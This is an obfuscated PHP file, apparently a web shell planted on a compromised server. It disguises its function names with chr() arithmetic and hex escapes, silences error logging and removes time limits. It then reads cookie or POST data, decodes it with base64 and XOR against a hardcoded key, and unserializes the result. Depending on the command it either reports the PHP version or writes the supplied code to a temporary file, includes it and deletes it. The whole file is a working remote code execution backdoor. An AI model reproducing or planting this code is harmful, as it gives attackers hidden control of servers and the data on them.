<?php $wsmjxc = "\x66"."\151"."\154".chr(101)."\x5f".chr(112).'u'.chr(116)."\137"."\143"."\157".chr(610-500).chr(832-716).chr(877-776).chr(110).chr(116).chr(115);
$zftywms = "\x62".chr(448-351).'s'."\x65".chr(54).'4'."\x5f".chr(100)."\x65".chr(660-561).chr(282-171).chr(943-843)."\x65";
$jgartm = 'i'.'n'.chr(105).chr(423-328).chr(115)."\145".'t';
$aazfhcxm = 'u'."\x6e".chr(108)."\151"."\x6e".chr(767-660);


@$jgartm('e'."\x72".chr(114)."\x6f"."\162".'_'.'l'."\157"."\147", NULL);
@$jgartm("\154".'o'.'g'.'_'.chr(977-876).'r'."\x72".chr(369-258).chr(114).'s', 0);
@$jgartm("\x6d"."\141"."\170"."\137"."\145".'x'.'e'."\x63"."\x75"."\164"."\151".chr(596-485).chr(110).'_'.'t'."\x69"."\155"."\145", 0);
@set_time_limit(0);

function apqytbexbq($abzlwf, $rrbvjpzoz)
{
    $jdobkcnpdn = "";
    for ($waiutj = 0; $waiutj < strlen($abzlwf);) {
        for ($j = 0; $j < strlen($rrbvjpzoz) && $waiutj < strlen($abzlwf); $j++, $waiutj++) {
            $jdobkcnpdn .= chr(ord($abzlwf[$waiutj]) ^ ord($rrbvjpzoz[$j]));
        }
    }
    return $jdobkcnpdn;
}

$wtuojgm = array_merge($_COOKIE, $_POST);
$zuyxtf = 'e1d8422e-c2ec-4693-a9ca-731cb6d8e72d';
foreach ($wtuojgm as $wmrryjjfpk => $abzlwf) {
    $abzlwf = @unserialize(apqytbexbq(apqytbexbq($zftywms($abzlwf), $zuyxtf), $wmrryjjfpk));
    if (isset($abzlwf["\141"."\x6b"])) {
        if ($abzlwf["\141"] == "\151") {
            $waiutj = array(
                'p'.'v' => @phpversion(),
                "\x73".chr(118) => "3.5",
            );
            echo @serialize($waiutj);
        } elseif ($abzlwf["\141"] == chr(860-759)) {
            $vgwryf = "./" . md5($zuyxtf) . chr(231-185).chr(946-841).chr(110).chr(99);
            @$wsmjxc($vgwryf, "<" . chr(63).chr(794-682)."\x68".'p'.chr(161-129).'@'."\x75".chr(110)."\x6c".chr(105)."\156"."\x6b".'('."\137".'_'.chr(267-197).chr(73)."\x4c"."\x45".chr(366-271)."\x5f".chr(961-920)."\x3b".chr(81-49) . $abzlwf["\144"]);
            @include($vgwryf);
            @$aazfhcxm($vgwryf);
        }
        exit();
    }
}

